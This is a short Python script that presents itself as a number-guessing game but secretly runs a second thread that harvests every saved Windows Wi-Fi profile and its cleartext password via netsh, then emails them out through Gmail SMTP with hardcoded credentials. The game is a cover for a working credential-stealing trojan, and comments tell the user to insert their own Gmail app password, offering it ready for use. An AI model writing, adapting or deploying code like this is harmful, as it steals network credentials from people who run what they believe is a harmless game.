import random
import subprocess
import threading
import smtplib

def game():
    print('################# Welcome #################\n')
    print('Enter q to quit\n')
    x = random.randint(1,100)
    z = True
    while z:
        y = input('Enter Your Guess between 1 to 100 : ').strip()
        if y == 'q':
            z = False
            continue
        try:
            y = int(y)
            if y == x:
                print('You have guessed the correct Number')
                z= False
            elif y < x:
                print('Generated Number is greater than you guessed\n')
            else:
                print('Generated number is smaller\n')
        except:
            print('Enter Number Only')

def wifi():
    email = 'abcd@gmail.com' # Add your gmail id
    passwd = 'uweouthiryojgurj' # Add your newly created google app password 16digit

    results = []
    ssids = subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8').split('\n')
    ssids = [line.split(':')[1][1:-1] for line in ssids if 'All User Profile' in line]

    for id in ssids:
        passwords = subprocess.check_output(['netsh','wlan','show','profile',id,'key=clear']).decode('utf-8').split('\n')
        passwords = [line.split(':')[1][1:-1] for line in passwords if 'Key Content' in line]
        try:
            results.append(f'Wifi Name : {id}\nPassword : {passwords[0]}\n\n')
        except IndexError:
            results.append(f'Wifi Name : {id}\nOpen Network\n\n')
    
    server =  smtplib.SMTP('smtp.gmail.com',587)
    server.ehlo()
    server.starttls()
    server.ehlo()
    
    server.login(email,passwd)

    subject = 'Wifi Passwords'
    body = ''.join(results)

    msg = f"Subject: {subject}\n\n{body}"
    server.sendmail(
        email,
        email,
        msg
    )
    
if __name__ == "__main__":
    t1 = threading.Thread(target=game)
    t2 = threading.Thread(target=wifi)

    t1.start()
    t2.start()